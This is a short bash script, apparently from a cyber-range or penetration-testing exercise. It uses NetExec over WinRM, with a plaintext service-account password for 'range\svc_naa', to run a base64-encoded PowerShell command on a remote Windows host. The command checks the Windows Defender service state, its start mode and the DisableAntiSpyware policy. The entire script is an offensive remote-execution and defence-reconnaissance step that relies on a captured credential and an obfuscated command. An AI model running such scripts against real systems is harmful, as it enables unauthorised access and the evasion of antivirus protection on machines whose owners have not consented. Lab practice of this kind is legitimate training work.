#!/bin/bash
CMD='$st=Get-Service WinDefend -ErrorAction SilentlyContinue; $pol=Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -ErrorAction SilentlyContinue; "WINDEFEND=" + $st.Status + "|startmode=" + (Get-CimInstance Win32_Service -Filter "Name=''WinDefend''" -ErrorAction SilentlyContinue).StartMode; "POLICY=" + $pol.DisableAntiSpyware'
B64=$(printf '%s' "$CMD" | iconv -f UTF-8 -t UTF-16LE | base64 -w0)
echo "=== 192.168.77.23 (mbr02) ==="
/tmp/nxc-venv/bin/nxc winrm 192.168.77.23 -u 'range\svc_naa' -p 'N@A_s3rv1c3!' -X "powershell -NoProfile -EncodedCommand $B64" 2>&1 | grep -E 'WINRM|WINDEFEND|POLICY|\[-\]' | head -6
